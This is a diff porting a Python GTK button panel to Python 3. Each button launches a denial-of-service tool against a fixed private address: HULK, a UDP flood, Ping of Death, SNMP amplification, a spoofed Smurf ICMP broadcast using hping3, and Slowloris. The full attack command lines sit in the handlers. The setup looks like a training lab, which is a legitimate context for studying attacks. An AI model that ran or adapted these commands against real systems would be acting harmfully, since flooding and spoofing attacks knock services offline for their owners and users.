@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3.10
 # -*- coding: utf-8 -*-
 
 from gi.repository import Gtk
@@ -7,26 +7,26 @@ import os
 
 class Handler:
     def button_1clicked(self, button):
-      print "HULK"
+      print ("HULK")
       os.system('python hulk.py http://10.10.21.102')
       runpy.run_path('/home/client/Desktop/Cyber/hulk.py')
     def button2_clicked(self, button):
-      print "UDP"
+      print ("UDP")
       os.system('python flood_udp.py 10.10.21.102 80 10')
       runpy.run_path('/home/client/Desktop/Cyber/flood_udp.py')
     def button3_clicked(self, button):
-      print "POD"
+      print ("POD")
       os.system('sudo python PoD.py')
       runpy.run_path('/home/client/Desktop/Cyber/PoD.py')
     def button4_clicked(self, button):
-      print "SNMP"
+      print ("SNMP")
       os.system('sudo python snmp-py.py 10.10.21.102 file.txt 1')
       runpy.run_path('/home/client/Desktop/Cyber/snmp-py.py')
     def button5_clicked(self, button):
-      print "SMURF ICMP"
+      print ("SMURF ICMP")
       os.system('sudo hping3 --icmp --spoof 10.10.21.102 10.10.21.255')
     def button6_clicked(self, button):
-      print "SLOWLORIS"
+      print ("SLOWLORIS")
       os.system('perl slowloris.pl -dns 10.10.21.102')
     
       
